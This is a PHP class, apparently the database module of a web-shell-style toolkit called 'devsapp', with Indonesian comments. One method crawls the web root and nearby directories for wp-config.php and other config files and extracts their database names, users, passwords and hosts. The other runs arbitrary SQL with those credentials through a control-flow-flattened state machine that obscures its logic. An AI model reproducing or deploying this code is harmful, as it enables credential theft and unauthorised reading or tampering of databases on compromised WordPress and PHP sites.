<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/DatabaseManager.php                           |
// |  Auto-discover DB credentials dari config file & eksekusi SQL.    |
// +------------------------------------------------------------------+

declare(strict_types=1);

class DatabaseManager {

    // ---- CFF state constants untuk executeQuery ----
    private const S_C0 = 0x100;   // Validasi input
    private const S_C1 = 0x200;   // Connect ke DB
    private const S_C2 = 0x300;   // Eksekusi query
    private const S_C3 = 0x400;   // Ambil hasil
    private const S_CF = 0xFFF;   // Terminal

    /**
     * Cari file config PHP yang mengandung DB_NAME, DB_USER, dll.
     * Mencari di cwd, DOCUMENT_ROOT, dan parent directory.
     *
     * @return array<int, array{name:string,user:string,pass:string,host:string,file:string}>
     */
    public function discoverDatabases(): array {
        $searchDirs = array_filter(
            [getcwd(), $_SERVER['DOCUMENT_ROOT'] ?? '', dirname(__DIR__)],
            static fn(string $dir) => $dir !== '' && is_dir($dir)
        );

        // Kumpulkan semua file PHP dari semua dir (depth 2)
        $allFiles = array_merge(...array_map(static function (string $dir): array {
            return array_merge(
                glob($dir . '/*.php')   ?: [],
                glob($dir . '/*/*.php') ?: []
            );
        }, $searchDirs));

        // Filter hanya file yang kemungkinan config
        $configFiles = array_filter($allFiles, static function (string $file): bool {
            $base = basename($file);
            return $base === 'wp-config.php' || str_contains($base, 'config');
        });

        // Parser kredensial dari define() WordPress-style
        $parseCredentials = static function (string $file): ?array {
            $content = @file_get_contents($file);
            if (!$content) return null;

            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)/",     $content, $mName);
            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)/",     $content, $mUser);
            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)/", $content, $mPass);
            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)/",     $content, $mHost);

            if (!isset($mName[1])) return null;
            return [
                'name' => $mName[1],
                'user' => $mUser[1] ?? 'root',
                'pass' => $mPass[1] ?? '',
                'host' => $mHost[1] ?? 'localhost',
                'file' => $file,
            ];
        };

        return array_values(array_filter(array_map($parseCredentials, $configFiles)));
    }

    /**
     * Eksekusi SQL query via PDO dengan CFF state machine.
     *
     * @return array{success:bool, data?:array, affected?:int, error?:string}
     */
    public function executeQuery(
        string $host,
        string $user,
        string $password,
        string $dbName,
        string $sql
    ): array {
        $result  = [];
        $pdo     = null;
        $stmt    = null;
        $state   = self::S_C0;

        while ($state !== self::S_CF) {
            switch ($state) {

                // State 0: Validasi SQL tidak kosong
                case self::S_C0:
                    if ($sql === '') {
                        $result = ['success' => false, 'error' => 'SQL cannot be empty.'];
                        $state  = self::S_CF;
                        break;
                    }
                    $state = self::S_C1;
                    break;

                // State 1: Buat koneksi PDO
                case self::S_C1:
                    try {
                        $pdo = new PDO(
                            "mysql:host={$host};dbname={$dbName};charset=utf8mb4",
                            $user,
                            $password,
                            [
                                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                            ]
                        );
                        $state = self::S_C2;
                    } catch (Exception $e) {
                        $result = ['success' => false, 'error' => $e->getMessage()];
                        $state  = self::S_CF;
                    }
                    break;

                // State 2: Eksekusi query
                case self::S_C2:
                    try {
                        $stmt  = $pdo->query($sql);
                        $state = self::S_C3;
                    } catch (Exception $e) {
                        $result = ['success' => false, 'error' => $e->getMessage()];
                        $state  = self::S_CF;
                    }
                    break;

                // State 3: Ambil hasil
                case self::S_C3:
                    if ($stmt->columnCount() > 0) {
                        $result = ['success' => true, 'data' => $stmt->fetchAll()];
                    } else {
                        $result = ['success' => true, 'affected' => $stmt->rowCount()];
                    }
                    $state = self::S_CF;
                    break;
            }
        }

        return $result;
    }
}
